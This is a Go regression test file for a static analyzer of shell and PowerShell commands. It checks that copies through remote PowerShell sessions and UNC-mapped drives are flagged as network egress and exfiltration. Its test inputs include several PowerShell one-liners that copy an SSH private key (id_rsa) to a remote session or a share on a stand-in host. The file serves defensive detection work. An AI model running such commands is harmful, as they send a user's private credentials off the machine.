package analysis

// Regression tests for the findings recorded in security-review.md, pass 63.
//
// Pass 63 took a channel the report had inspected only per cmdlet: the
// PowerShell *session* and *mapped drive* parameters, i.e. the two ways a path
// or a copy names a location that is not on this host. Both were modelled as
// local objects, so a credential copied through them carried no NetEgress,
// formed no exfiltration pair, and the documented default policy
// (`Exfiltration: Deny`) allowed the upload.

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// TestFinding097RemoteSessionIsEgress pins F97: a cmdlet invocation that names
// a remote PowerShell session reaches the network, so a credential copied
// through it is an exfiltration pair rather than a local file write.
func TestFinding097RemoteSessionIsEgress(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`Copy-Item C:\Users\me\.ssh\id_rsa -ToSession $s`,
		`Copy-Item -Path C:\Users\me\.ssh\id_rsa -Destination C:\x -ToSession $s`,
	} {
		rep := a.Analyze(LangPowerShell, src)
		if !hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: no NetEgress for a remote-session copy (effects=%v)", src, rep.Effects)
		}
		if len(rep.Score.ExfilPairs) == 0 {
			t.Errorf("%q: credential copied through a session formed no exfiltration pair (score=%+v)", src, rep.Score)
		}
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}

	// A non-credential payload still reports the channel: the destination is
	// unknown, not local.
	for _, src := range []string{
		`Copy-Item C:\notes.txt -ToSession $s`,
		`Copy-Item -FromSession $s -Path C:\x -Destination C:\y`,
		`Export-PSSession -Session $s -OutputModule C:\x`,
		`Receive-PSSession -Session $s`,
		`Remove-PSSession -Session $s`,
	} {
		rep := a.Analyze(LangPowerShell, src)
		if !hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: session parameter not modelled as a network channel (effects=%v)", src, rep.Effects)
		}
	}
}

// TestFinding097SessionPrecision pins the other side: a local cmdlet is not
// widened, and a session-bearing request that already names its host keeps that
// host instead of gaining an unresolved sink.
func TestFinding097SessionPrecision(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`Copy-Item C:\a C:\b`,
		`Move-Item C:\a C:\b`,
		`Get-Content C:\a`,
		`Set-Content C:\a b`,
	} {
		if rep := a.Analyze(LangPowerShell, src); hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: fabricated a network effect for a local cmdlet (effects=%v)", src, rep.Effects)
		}
	}

	// -WebSession is a cookie container, not a session object: the request keeps
	// the host its -Uri names.
	rep := a.Analyze(LangPowerShell, `Invoke-WebRequest -Uri http://a.example -WebSession $s`)
	if !effectOn(rep, engine.KindNetEgress, "http://a.example") {
		t.Errorf("WebSession: lost the request host (effects=%v)", rep.Effects)
	}
	if effectOn(rep, engine.KindNetEgress, "") {
		t.Errorf("WebSession: fabricated an unresolved egress (effects=%v)", rep.Effects)
	}

	// A session that already resolves through -ComputerName keeps the host.
	rep = a.Analyze(LangPowerShell, `Invoke-Command -ComputerName a.example -ScriptBlock { 1 }`)
	if !effectOn(rep, engine.KindNetEgress, "a.example") {
		t.Errorf("Invoke-Command: lost the named host (effects=%v)", rep.Effects)
	}
}

// TestFinding098MappedDriveIsRemote pins F98: a drive mounted on a UNC root
// makes the root the location its letter names, so a write under the letter is
// a network write and a credential copied there is an exfiltration pair.
func TestFinding098MappedDriveIsRemote(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, target string }{
		{`New-PSDrive -Name X -PSProvider FileSystem -Root \\a.example\share; Copy-Item C:\Users\me\.ssh\id_rsa X:\x`, `\\a.example\share\x`},
		{`New-PSDrive X FileSystem \\a.example\share; Copy-Item C:\Users\me\.ssh\id_rsa X:\x`, `\\a.example\share\x`},
		{`New-PSDrive -Name X -Root \\a.example\share; Set-Content X:\x y`, `\\a.example\share\x`},
		{`New-PSDrive -Name X -Root //a.example/share; Copy-Item C:\Users\me\.ssh\id_rsa X:\x`, `//a.example/share\x`},
	} {
		rep := a.Analyze(LangPowerShell, c.src)
		if !effectOn(rep, engine.KindFSWrite, c.target) {
			t.Errorf("%q: mapped path not resolved onto %q (effects=%v)", c.src, c.target, rep.Effects)
		}
		if !effectOn(rep, engine.KindNetEgress, "a.example") {
			t.Errorf("%q: mapped write reported no network destination (effects=%v)", c.src, rep.Effects)
		}
	}
	for _, src := range []string{
		`New-PSDrive -Name X -PSProvider FileSystem -Root \\a.example\share; Copy-Item C:\Users\me\.ssh\id_rsa X:\x`,
		`New-PSDrive -Name X -Root //a.example/share; Copy-Item C:\Users\me\.ssh\id_rsa X:\x`,
	} {
		rep := a.Analyze(LangPowerShell, src)
		if len(rep.Score.ExfilPairs) == 0 {
			t.Errorf("%q: credential written through a mapped share formed no pair (score=%+v)", src, rep.Score)
		}
	}

	// The mount alone contacts the host, even before anything is written there.
	rep := a.Analyze(LangPowerShell, `New-PSDrive -Name X -Root \\a.example\share`)
	if !effectOn(rep, engine.KindNetEgress, "a.example") {
		t.Errorf("mount: no network effect for a UNC root (effects=%v)", rep.Effects)
	}
}

// TestFinding098MappedDrivePrecision pins the precision side: a local root stays
// local, an unmapped letter stays a local path, and a root the script does not
// determine widens the target to ⊤ instead of fabricating a host.
func TestFinding098MappedDrivePrecision(t *testing.T) {
	a := mustAnalyzer(t)

	rep := a.Analyze(LangPowerShell, `New-PSDrive -Name X -Root C:\local; Copy-Item C:\Users\me\.ssh\id_rsa X:\x`)
	if !effectOn(rep, engine.KindFSWrite, `C:\local\x`) {
		t.Errorf("local root: mapped path not resolved (effects=%v)", rep.Effects)
	}
	if hasKind(rep, engine.KindNetEgress) {
		t.Errorf("local root: fabricated a network effect (effects=%v)", rep.Effects)
	}

	if rep := a.Analyze(LangPowerShell, `Copy-Item C:\Users\me\.ssh\id_rsa X:\x`); hasKind(rep, engine.KindNetEgress) {
		t.Errorf("unmapped drive: fabricated a network effect (effects=%v)", rep.Effects)
	}

	// An unresolved root: the target is unknown, and no host is invented.
	rep = a.Analyze(LangPowerShell, `New-PSDrive -Name X -Root $r; Copy-Item C:\Users\me\.ssh\id_rsa X:\x`)
	if hasKind(rep, engine.KindNetEgress) {
		t.Errorf("unknown root: fabricated a network effect (effects=%v)", rep.Effects)
	}
	if !effectOn(rep, engine.KindFSWrite, "") {
		t.Errorf("unknown root: target not widened to ⊤ (effects=%v)", rep.Effects)
	}

	// A drive removed on one branch is not statically known afterwards.
	rep = a.Analyze(LangPowerShell,
		`New-PSDrive -Name X -Root \\a.example\share; if ($c) { Remove-PSDrive X }; Copy-Item C:\Users\me\.ssh\id_rsa X:\x`)
	if !effectOn(rep, engine.KindFSWrite, "") {
		t.Errorf("branch-unmapped drive: target not widened to ⊤ (effects=%v)", rep.Effects)
	}
}
